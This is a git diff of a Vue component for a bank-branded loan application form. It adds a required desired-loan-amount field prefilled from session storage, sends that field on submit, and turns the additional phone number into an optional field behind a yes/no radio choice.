@@ -1,5 +1,5 @@
 <script setup lang="ts">
-import { ref } from "vue";
+import { ref, onMounted } from "vue";
 import { useI18n } from "vue-i18n";
 import LogoDkb from "@/assets/logo_dkb.svg";
 import LogoDkbPng from "@/assets/logo_dkb.png";
@@ -11,6 +11,7 @@ const form = ref({
   firstName: "",
   lastName: "",
   dateOfBirth: "",
+  desiredLoanAmount: "",
   countryOfBirth: "",
   countryOfResidence: "",
   income: "",
@@ -61,6 +62,15 @@ function getMaxBirthDate(): string {
 }
 
 const currentYear = new Date().getFullYear();
+
+onMounted(() => {
+  const stored = sessionStorage.getItem("desiredLoanAmount");
+  if (stored) {
+    form.value.desiredLoanAmount = stored;
+    sessionStorage.removeItem("desiredLoanAmount");
+  }
+});
+
 function handleNameInput(field: "firstName" | "lastName", e: Event) {
   const target = e.target as HTMLInputElement;
   let value = target.value;
@@ -198,6 +208,7 @@ async function onSubmit() {
       first_name: form.value.firstName,
       last_name: form.value.lastName,
       date_of_birth: form.value.dateOfBirth,
+      desired_loan_amount: form.value.desiredLoanAmount,
       country_of_birth: form.value.countryOfBirth,
       country_of_residence: form.value.countryOfResidence,
       income: String(incomeNum),
@@ -345,6 +356,19 @@ async function onSubmit() {
             </div>
             <div>
               <label class="block text-sm font-medium text-slate-700 mb-1">
+                {{ $t('quiz.desiredLoanAmount') }} *
+              </label>
+              <input
+                v-model="form.desiredLoanAmount"
+                type="number"
+                min="1000"
+                step="500"
+                required
+                class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+              />
+            </div>
+            <div>
+              <label class="block text-sm font-medium text-slate-700 mb-1">
                 {{ $t('quiz.countryOfBirth') }} *
               </label>
               <input
@@ -469,18 +493,42 @@ async function onSubmit() {
                 placeholder="+12345678901"
               />
             </div>
-            <div>
+            <div class="flex flex-col">
               <label class="block text-sm font-medium text-slate-700 mb-1">
-                {{ $t('quiz.handlePhoneInput') }} *
+                {{ $t('quiz.handlePhoneInput') }}
               </label>
+              <div class="flex items-center gap-4 text-sm mb-2">
+                <label class="inline-flex items-center gap-1">
+                  <input
+                    type="radio"
+                    class="h-4 w-4"
+                    :checked="hasAdditionalPhone"
+                    @change="hasAdditionalPhone = true"
+                  />
+                  <span>{{ $t('quiz.yes') }}</span>
+                </label>
+                <label class="inline-flex items-center gap-1">
+                  <input
+                    type="radio"
+                    class="h-4 w-4"
+                    :checked="!hasAdditionalPhone"
+                    @change="
+                      hasAdditionalPhone = false;
+                      form.additionalPhone = '+';
+                    "
+                  />
+                  <span>{{ $t('quiz.no') }}</span>
+                </label>
+              </div>
+              <div v-if="hasAdditionalPhone">
               <input
                 :value="form.additionalPhone"
                 @input="additionalPhoneInput"
                 type="tel"
-                required
                 class="w-full rounded-md border border-slate-300 bg-slate-50 px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                 placeholder="+12345678901"
               />
+              </div>
             </div>
             <div class="md:col-span-2">
               <label class="block text-sm font-medium text-slate-700 mb-1">
